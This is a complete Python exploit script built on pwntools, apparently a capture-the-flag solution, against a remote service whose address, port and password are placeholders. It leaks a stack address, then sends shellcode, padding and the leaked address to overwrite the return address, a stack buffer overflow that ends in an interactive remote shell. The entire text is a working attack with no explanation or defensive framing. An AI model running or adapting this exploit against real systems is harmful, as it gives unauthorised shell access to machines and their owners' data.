from pwn import *

def main():
    context.log_level = 'DEBUG'
    context(os='linux', arch='amd64')
    # io = process('./xxxx')
    io = remote('x.x.x.x', 1111)
    password = 'xxxx'
    return_address_offset = 84
    max_payload_length = 137

    io.sendlineafter('> ', b'1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address, endian="big")
    log.success(f'Leaked stack address: {p64(stack_address)}')

    io.sendlineafter('> ', b'2')
    io.sendlineafter('password: ', password.encode())

    shellcode = asm(
            shellcraft.popad() +
            shellcraft.sh()
    )
    padding = b'a' * (return_address_offset - len(shellcode))
    payload = shellcode + padding + p64(stack_address)
    assert len(payload) <= max_payload_length, f'Payload too big. "{len(payload)}"'

    io.sendlineafter('commands: ', payload)

    io.sendlineafter('> ', b'3')
    io.interactive()


if __name__ == '__main__':
    main()
